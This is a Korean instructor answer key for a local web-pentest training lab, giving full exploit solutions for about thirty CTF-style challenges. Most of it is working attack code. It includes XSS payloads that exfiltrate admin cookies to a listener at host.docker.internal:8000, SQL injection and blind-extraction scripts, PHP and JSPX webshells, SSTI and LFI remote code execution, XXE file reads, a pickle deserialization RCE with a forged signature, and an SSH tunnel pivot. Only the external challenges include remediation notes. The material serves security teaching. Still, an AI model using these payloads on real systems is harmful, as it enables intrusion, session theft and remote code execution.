# web-pentest-edu — 전체 문제 풀이 (강사용 정답지)

> 인-레포 26문제 + 외부 GitHub 챌린지 3종(authbypass-basic/advanced·secret-tunnel). 인-레포 26문제는 로컬 도커 기동 상태에서 **실제 익스플로잇으로 flag 획득까지 검증**됨.
> 스크립트가 필요한 문제는 이 폴더의 `.py` 사용. 외부 3종은 소스 분석 기반 풀이(맨 아래 [외부 GitHub 챌린지](#외부-github-챌린지) 절).

## 0. 준비

```powershell
# 1) 실습 환경 기동 (루트에서)
.\start.ps1

# 2) (client 문제 공용) exfil 수신 서버 — 별도 터미널에서 켜둔다
python solution\exfil_server.py            # host:8000 수신
```

- **client(봇) 문제의 report URL 은 반드시 서비스명**: `http://xss-1:9101/board/<seq>` (localhost 금지 → 봇이 엉뚱한 오리진에 로그인/방문).
- 쿠키·데이터 외부 수신은 `host.docker.internal:<port>` (봇 컨테이너 → 호스트).
- 아래 `curl` 예시는 **Git Bash** 기준. **PowerShell 이면 `curl` → `curl.exe`** 로 바꿔 쓰거나, OS 무관한 `.py` 스크립트를 사용.
- 봇 동작 확인: `docker logs bot`.

| 스크립트 | 대상 문제 |
|---|---|
| `exfil_server.py` | (공용 수신) xss-1/2/3 · domclobbering · prototype-pollution |
| `sqli3_blind.py` | sqli-3 |
| `cmdi_oob.py` | cmdi-1 |
| `race_transfer.py` | race-transfer |
| `xss_exploit.py` | xss-1 · xss-2 · xss-3 |
| `csrf_exploit.py` | csrf-1 · csrf-2 |
| `client_misc.py` | domclobbering · prototype-pollution |
| `xsleak_server.py` + `xsleak_solve.py` | xsleak |
| `fsi_sqli.py` | fsi-chat-sqli (외부 :9090) |
| `fsi_xss.py` | fsi-chat-xss (외부 :9090) |

---

## 인증 · 인가

### idor-balance (:9301) — IDOR
- **취약점**: 계좌 조회가 `acct` 파라미터만으로 동작, 세션 소유자 검증 없음. admin 계좌(1000) 메모에 flag.
- **풀이**: guest 로그인 후 자기 계좌(1001)가 아닌 **1000** 을 조회.
```bash
curl -s -c c.txt -d 'u=guest&p=guest' http://localhost:9301/login
curl -s -b c.txt 'http://localhost:9301/balance?acct=1000'
# → 계좌 1000 · 잔액 … · 메모: flag{...}
```

### 2fa-bypass (:9302) — 2차인증 검증 우회
- **취약점**: 비번 단계 후 `stage='otp'`. 그러나 `/secret` 이 `'done'` 이 아니라 `'otp'` 도 허용.
- **풀이**: 로그인 직후 OTP 생략하고 `/secret` 직접 접근.
```bash
curl -s -c c.txt -d 'u=guest&p=guest' http://localhost:9302/login
curl -s -b c.txt http://localhost:9302/secret
# → 기밀: flag{...}
```

---

## 클라이언트 사이드

### xss-1 (:9101) — 기본 반사형 (쿠키 탈취)
- **취약점**: 본문이 escape 없이 출력(Stored XSS). admin 봇은 flag 를 쿠키로 보유.
- **풀이**: `python solution\xss_exploit.py xss-1` → `exfil_server` 에 `?xss1=flag=flag{...}` 수신.
- **payload**(글 본문):
```html
<script>new Image().src='http://host.docker.internal:8000/?xss1='+encodeURIComponent(document.cookie)</script>
```

### xss-2 (:9102) — 필터 우회
- **취약점**: `script·on·( )·'·javascript` 차단. HTML 엔티티 + iframe javascript: 로 우회. flag 는 admin 쿠키.
- **풀이**: `python solution\xss_exploit.py xss-2` → `?xss2=<base64>` 수신 → base64 디코딩.
- **payload**:
```html
sad<iframe src="javas&#x63;ript:fetch&#x28;&#x27;http://host.docker.internal:8000/?xss2=&#x27;+btoa&#x28;document.cookie&#x29;&#x29;">
```

### xss-3 (:9103) — 내부글 읽기
- **취약점**: `fetch·eval·constructor·( )·'·"` 차단. flag 는 admin 글(`/board/0`).
- **풀이**: `python solution\xss_exploit.py xss-3` → `?xss3=<HTML>` 수신 → `flag{...}` 추출. 괄호는 전부 `\x28/\x29`, 실행은 `Set.constructor` 백틱 태그드 템플릿.
- **payload**:
```html
<script>Set[`co`+`nst`+`ructor`]`f\x65tch\x28\x27/board/0\x27\x29.then\x28e=>e.text\x28\x29\x29.then\x28e=>{f\x65tch\x28\x27http://host.docker.internal:8000/?xss3=\x27+encodeURIComp\x6fnent\x28e\x29\x29}\x29```</script>
```

### csrf-1 (:9104) — 비밀번호 변경
- **취약점**: 마크다운 이미지 `![alt](url)` → `<img src=url>`. admin changepw 는 내부(봇)에서만.
- **풀이**: `python solution\csrf_exploit.py csrf-1` → 봇이 admin 비번을 `pwned123` 으로 변경 → admin 로그인해 `/board/0` 의 flag 읽기.
- **payload**(글 본문): `![x](/changepw?userid=admin&userpw=pwned123)`

### csrf-2 (:9105) — 토큰 누출 체이닝
- **취약점**: changepw 에 세션 `csrf_token` 필요 → XSS 로 토큰 누출 후 호출.
- **풀이**: `python solution\csrf_exploit.py csrf-2` → admin 비번 `haha2026` → `/board/0`.
- **payload**:
```html
<script>window[`f\x65tch`](`/changepw`).then(e=>e.text()).then(e=>{idx=e.indexOf(`csrf_token`)+19;tok=e.slice(idx,idx+32);window[`f\x65tch`](`/changepw?userid=admin&userpw=haha2026&csrf_token=`+tok)})</script>
```

### xsleak (:9106) — CSS Injection XS-Leak
- **취약점**: admin 이 보면 `href="javascript:alert('flag…')"` 렌더. script 차단·style 허용 → 속성선택자로 한 글자씩 누출.
- **풀이**(2 터미널):
```powershell
python solution\xsleak_server.py     # 터미널 A: 공격 CSS 서버(host:8001)
python solution\xsleak_solve.py      # 터미널 B: @import 주입 + 반복 신고 → flag 복원
```
- **주입**(글 본문): `<style>@import url("//host.docker.internal:8001/leak.css");</style>`

### domclobbering (:9107) — DOM Clobbering
- **취약점**: `window.CLOB.isAdmin` 참이면 `eval(c)`. HTML 주입으로 클로버링. flag 는 `#flag`(봇·내부일 때).
- **풀이**: `python solution\client_misc.py domclobbering` → `exfil_server` 에 `?dc=flag{...}`.
- **payload**(`?c=`): 따옴표/슬래시 차단 → 정규식 `.source`·`fromCharCode` 우회
```
/<form id=CLOB><input id=isAdmin>/;_=String.fromCharCode(0x2f);fetch(/http:/.source+_+_+/host.docker.internal:8000?dc=/.source+flag.innerText)
```

### open-redirect (:9108) — Open Redirect (봇 불필요)
- **취약점**: `is_safe` = `'/'` 시작 또는 `'localhost'` 포함이면 통과. 'localhost' 를 경로에 끼우고 실제 host 는 외부로.
```bash
curl -s "http://localhost:9108/go?next=http://evil.com/localhost"
# → open redirect 성공! flag{...}
```

---

## 서버 사이드 (인젝션)

### sqli-1 (:9201) — 기본
- **취약점**: 입력이 쿼리에 그대로 결합. admin 반환 시 flag.
```bash
curl -s "http://localhost:9201/?userid=admin%27--%20-&userpw=x"
```

### sqli-2 (:9202) — 필터 우회
- **취약점**: WAF(공백·or·admin·숫자 차단). 공백=`%0a`, admin=`concat('ad','min')`.
```bash
curl -s "http://localhost:9202/?userid=a%27%3D%27a%27%23%0aand%23%0auserid%3Dconcat(%27ad%27,%27min%27)%23&userpw=x"
```

### sqli-3 (:9203) — Blind
- **취약점**: 응답이 admin/실패만(Blind). 숫자 차단 → `length('a..')`, 비교 → `ascii()` 이진탐색.
```powershell
python solution\sqli3_blind.py        # admin 비밀번호(=flag) 자동 복원
```

### lfi-1 (:9204) — php filter
- **취약점**: `?p=` 임의 파일 include. filter 로 소스를 base64.
```bash
b=$(curl -s "http://localhost:9204/?p=php://filter/convert.base64-encode/resource=lfiflag.php" | grep -oE '[A-Za-z0-9+/=]{20,}' | head -1)
echo "$b" | base64 -d        # → <?php $flag="flag{...}";
```

### lfi-2 (:9205) — 세션 RCE
- **취약점**: 입력이 세션에 저장 + 세션파일 LFI include 가능. `/readflag`(실행전용) RCE 필요.
- **주의**: PHP 8 — `$_GET[c]` 는 Fatal, 따옴표 필수(`$_GET['c']`).
```bash
SID=pwn
curl -s -b "PHPSESSID=$SID" "http://localhost:9205/?p=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%3F%3E" -o /dev/null
curl -s -b "PHPSESSID=$SID" "http://localhost:9205/?p=/tmp/sess_$SID&c=/readflag"
# → flag{...}
```

### cmdi-1 (:9206) — Command Injection (Blind)
- **취약점**: shell 실행되나 출력 미반환. flag 는 `/command_injection_flag.txt`.
```powershell
python solution\cmdi_oob.py            # TCP 리스너 자동 + OOB 유출 → flag 출력
```

### ssti-1 (:9207) — SSTI → RCE
- **취약점**: `name` 이 `render_template_string` 에 결합 → RCE.
```bash
curl -s "http://localhost:9207/?name=%7B%7Bcycler.__init__.__globals__.os.popen('cat%20/flag.txt').read()%7D%7D"
```

### xxe-1 (:9208) — XXE
- **취약점**: 외부 엔티티 확장 허용 → 파일 읽기.
```bash
printf '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag.txt">]>\n<order><name>&xxe;</name></order>' > x.xml
curl -s -XPOST --data-binary @x.xml http://localhost:9208/order
# → 주문자: flag{...}
```

### upload-webshell (:9501) — File Upload → 웹쉘
- **취약점**: `.php` 만 차단 → `.phtml` 우회(서버가 PHP 로 실행). flag 는 `/flag_upload.txt`.
```bash
printf '<?php system($_GET[0]); ?>' > shell.phtml
curl -s -F "f=@shell.phtml" http://localhost:9501/ >/dev/null
curl -s "http://localhost:9501/uploads/shell.phtml?0=cat%20/flag_upload.txt"
```

### ssrf-internal (:9502) — SSRF
- **취약점**: 입력 URL 을 서버가 대신 요청. `/internal/flag` 는 localhost 만 허용.
```bash
curl -s "http://localhost:9502/fetch?url=http://127.0.0.1:9502/internal/flag"
```

### prototype-pollution (:9503) — Prototype Pollution
- **취약점**: `merge` 가 `__proto__` 병합 → `isAdmin` 오염 → `eval(code)`. flag 는 `#flag`(봇·내부).
- **풀이**: `python solution\client_misc.py prototype-pollution` → `exfil_server` 에 `?pp=flag{...}`.
- **payload**(`?c=`): `{"__proto__":{"isAdmin":true,"code":"fetch('http://host.docker.internal:8000?pp='+flag.innerText)"}}`

---

## 서버 사이드 (JSP / Java)

### jsp-sqli (:9601) — SQL Injection
```bash
curl -s "http://localhost:9601/login.jsp?userid=admin%27--%20-&userpw=x"
```

### jsp-upload (:9602) — File Upload (.jspx 우회)
- **취약점**: `.jsp` 로 끝나는 이름만 차단 → `.jspx`(JSP document) 통과·실행. flag `/flag`.
```bash
cat > shell.jspx <<'EOF'
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("c")).getInputStream();
  byte[] b = new byte[in.available()]; in.read(b); out.println(new String(b));
</jsp:scriptlet>
</jsp:root>
EOF
curl -s -F "f=@shell.jspx" http://localhost:9602/upload >/dev/null
curl -s "http://localhost:9602/uploads/shell.jspx?c=cat%20/flag"
```

### jsp-pathtraversal (:9603) — Path Traversal
- **취약점**: `download.jsp` 경로검증 없음. base=`/files/` → `../WEB-INF` 접근(직접접근 불가).
```bash
curl -s "http://localhost:9603/download.jsp?file=../WEB-INF/flag.txt"
```

---

## 캡스톤

### jsp-chain (:9711) — JSP 체인 (PathTraversal → 정보노출 → 인증우회 RCE)
- **취약점**: `download` 경로조작으로 WEB-INF 유출 → 클래스 디컴파일로 하드코딩 키(`OPS_KEY`) 획득 → 숨은 운영 엔드포인트 RCE.
```bash
# 1) 숨은 매핑 확인
curl -s "http://localhost:9711/download?file=WEB-INF/web.xml"        # /sys/exec-9f3a (com.corp.AdminServlet)
# 2) 클래스 받아 키 추출 (디컴파일 대신 strings 로도 노출)
curl -s "http://localhost:9711/download?file=WEB-INF/classes/com/corp/AdminServlet.class" -o Admin.class
strings Admin.class | grep -i zx9     # OPS_KEY = Zx9_d3c0mp1l3_th1s_k3y_2026
# 3) 인증 RCE
curl -s "http://localhost:9711/sys/exec-9f3a?key=Zx9_d3c0mp1l3_th1s_k3y_2026&cmd=cat%20/flag"
# → flag{...}
```

---

## 외부 GitHub 챌린지

> 각자 own docker-compose. `start.ps1` 기본 기동(또는 `setup_external.ps1` 후 각 폴더 `docker compose up`).
> 풀이는 소스(`challenges/auth/authbypass-*/app/app.py`, `challenges/capstone/secret-tunnel/src/`) 분석 기반.
> FSI 채팅(`fsi-chat-sqli`/`fsi-chat-xss`, :9090)은 `setup_external` 가 `challenges/capstone/fsi-chat/` 로 클론하며, `start.ps1 -WithFsi`(셸: `--with-fsi`)로 기동(10.111.0.0/24 고정 대역).

### authbypass-basic (:9001) — 은행 인증우회 (간편비밀번호 등록 결함)  ✓ 실익스플로잇 검증됨
- **취약점**: `register_simplepass` 가 **폼의 `userid`** 로 간편비밀번호를 등록(세션 사용자 아님) → admin 의 간편비번을 공격자가 설정 가능. `/getflag` 는 잔액>10억일 때 flag(admin 잔액은 천문학적).
- **풀이**:
```
1) 가입·로그인 (POST /register, POST /login)
2) 내 휴대폰번호 확인(/my) → SMS 인증 통과:
   GET /api/send_authmsg?phonenum=<내 폰>      # 인증코드 발송
   GET /api/get_sms_msg?phonenum=<내 폰>       # 코드 읽기
   POST /smsauth  (userid=<나>&phonenum=<내 폰>&authnum=<코드>)   # 2factor_success
3) admin 간편비번 등록(핵심 — userid=admin):
   POST /register_simplepass  userid=admin&simplepass1=123456&simplepass2=123456
   → 응답의 localStorage.setItem('simplepass_key','<KEY>') 에서 KEY 확보
4) admin 으로 간편로그인:
   POST /login_simplepass  simplepass_key=<KEY>&simplepass=123456
5) GET /getflag  → flag{...}   (admin 잔액 > 10억)
```
- **대응**: 간편비번 등록을 인증된 세션 사용자(`session['userid']`)로만 허용.

### authbypass-advanced (:9005) — 강화판 (SMS + 계좌 1원 다중인증)  ✓ 실익스플로잇 검증됨
- **변경점(패치)**: basic 의 폼-userid 결함을 막아 `register_simplepass` 가 `userid=session['authid']` 로 동작. 추가로 **SMS 인증 + 계좌 1원 인증** 2중 도입.
- **취약점(핵심)**: 등록 대상 `authid`(= `register_simplepass?userid=` 로 세션 저장)와 인증요소가 **바인딩되지 않음**.
  - SMS 2FA 결과 `session['2factor_success']` 는 단순 불리언 → *내 계정으로* 통과시켜도 됨(누구의 인증인지 검사 안 함).
  - 계좌 1원 인증코드가 `send_acctauth_msg` **응답에 그대로 노출**(`send auth num success <4자리>`), 입금은 `authid`(admin) 계좌로.
  - 즉 "내 폰으로 SMS 통과 + admin 1원코드 응답 노출"로 **admin 의 간편비번을 등록**.
- **풀이(파이썬, 표준 라이브러리)**:
```python
import urllib.request, urllib.parse, http.cookiejar, re
B="http://localhost:9005"
op=lambda: urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
post=lambda o,u,d: o.open(u,urllib.parse.urlencode(d).encode(),timeout=10).read().decode()
get =lambda o,u: o.open(u,timeout=10).read().decode()

s=op(); u="hacker"; pw="pw12345"
post(s,B+"/register",{"userid":u,"userpw":pw}); post(s,B+"/login",{"userid":u,"userpw":pw})
phone=re.search(r"018-\d{4}-\d{4}", get(s,B+"/my")).group(0)          # 내 폰번호
get(s,B+"/register_simplepass?userid=admin")                         # ① authid=admin 저장
# ② SMS 2FA — 내 계정으로 통과(2factor_success). 자기 폰 코드만 읽힘.
get(s,B+"/api/send_smsauth_msg?phonenum="+phone)
code=get(s,B+"/api/get_sms_msg?phonenum="+phone).strip()
post(s,B+"/smsauth",{"userid":u,"phonenum":phone,"authnum":code})
# ③ 계좌 1원 인증 — authid(admin)에게 1원 + 코드가 응답에 노출
acct=re.search(r"success\s+(\d{4})", get(s,B+"/api/send_acctauth_msg")).group(1)
post(s,B+"/acctauth",{"authnum":acct})
# ④ admin 간편비번 등록 → simplepass_key 확보
key=re.search(r"simplepass_key','([0-9a-f]+)'",
        post(s,B+"/register_simplepass",{"simplepass1":"123456","simplepass2":"123456"})).group(1)
# ⑤ admin 으로 간편로그인 → getflag
a=op(); post(a,B+"/login_simplepass",{"simplepass_key":key,"simplepass":"123456"})
print(re.search(r"flag\{[^}]+\}", get(a,B+"/getflag")).group(0))      # → flag{...}
```
- **대응**: 인증요소(SMS·계좌)를 등록 대상(`authid`)·동일 세션·동일 사용자로 강하게 바인딩 · 인증코드 응답/내역 비노출.

### secret-tunnel (:8090, SSH :2222) — 캡스톤 (역직렬화 RCE → SSH 터널 피벗)  ✓ 실익스플로잇 검증됨
- **구성**: `extserver`(외부망·web+ssh) → `intserver`(외부+내부망·ctfuser=restricted shell) → `flagserver`(내부망 **전용**·flaguser/암호·`/home/flaguser/flag.txt`).
- **취약점(체인)**:
  - ① `extserver /process` 가 서명검증 후 `pickle.loads` → **역직렬화 RCE**. 서명키 `SECRET_KEY="very_secret_key_do_not_guess"` 하드코딩 → `md5(data+KEY)` 로 **서명 위조**.
  - ② extserver 에 `id_rsa` 유출(intserver ctfuser 가 같은 공개키 신뢰).
  - ③ ctfuser 쉘이 restricted 라도 `AllowTcpForwarding yes` → **scp·SSH 터널은 동작**(쉘 우회).
- **풀이(파이썬)**:
```python
import pickle, base64, hashlib, subprocess, urllib.request, urllib.parse
KEY="very_secret_key_do_not_guess"
def rce(cmd):                       # 위조서명 + pickle RCE — 명령 출력이 응답으로 반환
    full="("+cmd+") 2>&1; true"     # check_output 은 비0 종료 시 500 → '; true' 로 감쌈
    class E:
        def __reduce__(self): return (subprocess.check_output, (['sh','-c',full],))
    data=base64.b64encode(pickle.dumps(E())).decode()           # 바이트에 'pickle' 만 없으면 필터 통과
    sig=hashlib.md5((data+KEY).encode()).hexdigest()
    body=urllib.parse.urlencode({"data":data,"signature":sig}).encode()
    return urllib.request.urlopen("http://localhost:8090/process",body,timeout=50).read().decode()

O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8"
# ① intserver 에서 flagserver 비번 scp (restricted shell 이어도 scp 동작) → secretpassword1!
rce("scp -i /home/appuser/.ssh/id_rsa %s ctfuser@intserver:/home/ctfuser/flagserver_password.txt /tmp/pw" % O)
# ② intserver 경유 flagserver:22 터널(키인증) + flagserver 비번(askpass, sshpass 없음) → flag
proxy="ssh -i /home/appuser/.ssh/id_rsa "+O+" -W %h:%p ctfuser@intserver"
chain=("printf '#!/bin/sh\\necho secretpassword1!\\n'>/tmp/ap; chmod +x /tmp/ap; "
       "SSH_ASKPASS=/tmp/ap SSH_ASKPASS_REQUIRE=force DISPLAY=x "
       "ssh "+O+" -o ProxyCommand=\""+proxy+"\" flaguser@flagserver 'cat /home/flaguser/flag.txt'")
print(rce(chain))      # → flag{...}
```
> 사람이 직접 풀 땐: RCE 로 `id_rsa` 를 빼낸 뒤 `ssh -i id_rsa -p2222 appuser@<host>` 로 extserver 접속 → 위와 동일하게 `-J ctfuser@intserver flaguser@flagserver` 점프(터널)로 내부 flagserver 접근.
- **대응**: 신뢰경계 입력에 `pickle` 금지(JSON 등 안전 포맷) · 서명키/자격증명 비공개·분리 · 내부망 접근통제·점프호스트 최소권한(restricted shell 만으론 터널 못 막음 → `AllowTcpForwarding no`).

### fsi-chat-sqli (:9090) — FSI 채팅 SQLi 파일유출 (error-based blind)  ✓ 실익스플로잇 검증됨
- **취약점**: `ext/app.py` 의 다른 쿼리는 `safeQuery()`(`" \ | & [ ] ! @ # $ %` 이스케이프)를 거치지만 **`download()` 만 `filepath` 를 그대로** f-string 에 넣는다 → raw SQLi(`"` 미이스케이프로 문자열 탈출).
  `select loginid from board where filepath="{filepath}" limit 0,1`.
  db 는 `--secure-file-priv="/upload/"` 라 `/upload/flag.txt`(=SQLi flag) 를 `load_file` 가능.
- **보정(의도된 난이도)**: `download()` 는 ① `union|select|extractvalue|updatexml|sleep|benchmark` 키워드 거부 ② 원본 SQL 에러·소유자 값 미반영(generic `"download error.."`). → **UNION 직접추출·에러메시지(XPATH) 추출·시간기반이 모두 막힌다.** 관측 가능한 신호는 *‘쿼리 에러 발생 여부’* 하나뿐 → **산술 오버플로 boolean-blind** 가 정공법.
- **익스 원리**: `filepath = zz" or if(<COND>, 0xffffffffffffffff*0xffffffffffffffff, 0)-- -`
  - `COND` 참 → `0xff..*0xff..` 평가 → **BIGINT UNSIGNED out of range**(1690) → 응답 `"download error.."`
  - `COND` 거짓 → `if`=0 → where 거짓 → 응답 `"select result has no data"`
  - `COND = ascii(substr(load_file(0x2f75706c6f61642f666c61672e747874), i, 1)) > mid` (경로 `/upload/flag.txt` 는 따옴표 충돌 회피로 hex, 한 글자씩 이분탐색)
- **풀이(파이썬)** — `solution/fsi_sqli.py`:
```python
import requests, re
B="http://localhost:9090"; s=requests.Session(); FILE="0x2f75706c6f61642f666c61672e747874"
s.post(B+"/register",data={"userid":"u1","userpw":"p1"}); s.post(B+"/login",data={"userid":"u1","userpw":"p1"})
def err(cond):  # cond 참이면 오버플로 에러
    p='zz" or if(%s, 0xffffffffffffffff*0xffffffffffffffff, 0)-- -' % cond
    return "download error" in s.get(B+"/download",params={"filepath":p}).text
flag=""
for i in range(1,80):
    if not err("ascii(substr(load_file(%s),%d,1))>0"%(FILE,i)): break
    lo,hi=0,128
    while lo+1<hi:
        m=(lo+hi)//2
        lo,hi=(m,hi) if err("ascii(substr(load_file(%s),%d,1))>%d"%(FILE,i,m)) else (lo,m)
    flag+=chr(hi)
print(re.search(r"fsi2022\{[^}]*\}",flag).group(0))   # → fsi2022{yes_y0u_c4n_le4k_fi1e_by_sq1i!}
```
- **대응**: `filepath` 도 파라미터 바인딩/화이트리스트(파일명 패턴)로 처리 — 키워드 블랙리스트는 우회 가능하므로 근본해법 아님 · `secure-file-priv` 와 DB 계정 `FILE` 권한 최소화 · 에러/분기 응답을 단일화해 oracle 자체를 제거.

### fsi-chat-xss (:9090) — FSI 채팅 XSS → SSRF → 내부보드 flag 탈취  ✓ 체인 검증됨(봇 클릭만 버전부패)
- **구성**: `external`(10.111.0.3, 공개보드) · `internal`(10.111.0.4: **author 검사 없는** 내부보드 `int/app.py` + **admin 봇** `bot.py`) · db 공유. 봇은 egress 방화벽(`OUTPUT DROP`)으로 10.111.0.3/10.111.0.5 만 통신 → 외부 리스너 탈취 불가, **공유 DB 경유**가 정공법.
- **취약점**: `view.html` 의 `<a href="javascript:fileDown('{{filepath}}')" id="uploadFile">`. Jinja 가 `'→&#39;` 로 이스케이프하지만 **`javascript:` URI 는 브라우저가 HTML 디코드 후 JS 실행**하므로 `&#39;` 가 다시 `'` 가 되어 문자열 탈출이 가능. `safeQuery` 는 `' ( ) ;` 를 막지 않으므로 **파일명(=filepath)에 JS 를 심으면** 봇이 `uploadFile` 클릭 시 admin 컨텍스트에서 실행된다. 내부보드 `getBoardView` 는 `where seq="..."`(author 검사 없음) → admin 봇이 `/board/1`(flag 글) 을 열람 가능.
- **체인**: ① 공개보드에 *빈 파일*을 올리되 **파일명을 페이로드**로(→`board.filepath`) ② `/report` 로 내부보드 뷰 `http://10.111.0.4:9090/board/<myseq>` 신고 ③ admin 봇 클릭 → `XHR GET /board/1` 로 flag 읽고 → 내부 `/write` 로 **제목=flag, author=admin** 새 글 작성 ④ 공격자는 공개보드 목록에서 회수(`getBoardList` 가 `... or author="admin"` → admin 글 *제목*(=flag)이 내 목록에 노출).
- **풀이(파이썬, 공격자측)** — `solution/fsi_xss.py`. 봇이 클릭으로 실행할 JS 는 `safeQuery` 금지문자와 *리터럴 `/`* 를 모두 회피(`'/'`=`fromCharCode(47)`, 본문=`FormData` 라 `&` 불필요):
```python
JS=("var s=String.fromCharCode(47);"
    "var x=new XMLHttpRequest();x.open('GET',s+'board'+s+'1',false);x.send();"     # admin 으로 flag 글 열람
    "var t=x.responseText;var i=t.indexOf('fsi2022');var f=t.substring(i,t.indexOf('}',i)+1);"
    "var fd=new FormData();fd.append('subject',f);fd.append('author','admin');fd.append('content','x');"
    "var w=new XMLHttpRequest();w.open('POST',s+'write',false);w.send(fd);")        # 공유 DB 로 exfil
filename="');"+JS+"v=('"        # fileDown('<filename>') 탈출 → fileDown('');JS;v=('')
# s.post('/write', data={'subject':m,'author':uid,'content':'x'}, files={'file':(filename, b'')})
# s.post('/report', data={'url':'http://10.111.0.4:9090/board/<myseq>'})  → 목록에서 fsi2022{...} 회수
```
- **검증**: payload 가 `safeQuery` 무손상 통과 + 내부 `/board/<seq>` 의 href 에 그대로 렌더됨(확인), admin 세션이 `/board/1` flag 열람(확인 → `fsi2022{n0w_you_4re_g00d_at_xss_m4ybe?}`), 공유보드 경유 회수(확인). 단 **봇의 literal chromium 클릭**은 봇 이미지의 *Selenium 3.141 + 2022 chrome ↔ 2026 chrome* 버전부패로 막힐 수 있음(“chrome not reachable”). 복구: `bot.py` 에 `--headless=new`·`--remote-allow-origins=*`·`--disable-dev-shm-usage` 추가 + chromedriver 를 설치된 chrome 버전에 맞춰 교체, 근본적으론 int 이미지를 python3.8+/selenium4 로 갱신.
- **대응**: `javascript:` 싱크 제거(href 에 사용자입력 금지)·출력 인코딩 · `safeQuery` 에 `' ( )` 포함 · 내부보드 `getBoardView` 인가검사 · 봇 egress 제한 + CSP.

---

## 정리

```powershell
.\start.ps1 -Down        # 전체 정리 (외부 챌린지 포함)
```
획득한 `flag{...}` 는 스코어보드(`http://localhost:9000`) 로그인 후 제출 → solved·랭킹 반영.
